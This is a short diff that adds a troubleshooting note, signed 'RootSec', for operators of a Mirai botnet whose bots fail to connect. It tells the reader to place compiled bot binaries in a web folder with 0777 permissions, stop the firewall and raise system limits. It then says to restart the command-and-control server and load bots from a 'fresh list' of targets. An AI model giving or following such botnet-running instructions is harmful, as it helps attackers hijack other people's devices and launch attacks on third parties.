@@ -1,0 +1,34 @@
+If bots dont join after you have done all the setup in the correct way and bots dont join when you try to load some bots with the ./loader try:
+
+
+First of all, move all arch in /release folder that you have in /root after you have compiled with build.sh in var/html/www/bins
+
+mv arch files in /release in var/html/www/bins (if bins dir dont exist, make it)
+and try to chmod.
+
+chmod 0777 var/
+chmod 0777 var/html
+chmod 0777 var/html/www
+chmod 0777 var/html/www/bins
+chmod 0777 var/html/www/bins/*
+
+
+service iptables stop 
+service httpd restart  
+service mysqld/mariadb restart
+
+nano /usr/include/bits/typesizes.h
+scroll down and edit the 1024 to 999999
+
+ulimit -n999999; ulimit -u999999; ulimit -e999999
+
+THEN RESTART THE BOTNET:
+
+screen ./cnc
+
+
+AND TRY TO LOAD SOME BOTS (USE FRESH LIST) IF YOU ARE SURE THAT BOTS DONT JOIN FOR THIS ERROR AND NOT BECAUSE YOU USE DEAD LISTS...
+
+If this still dont dont work, make you sure you dont have edited some port in the source of mirai or have wronged some steps of mirai installation like mysql or other.
+
+- RootSec
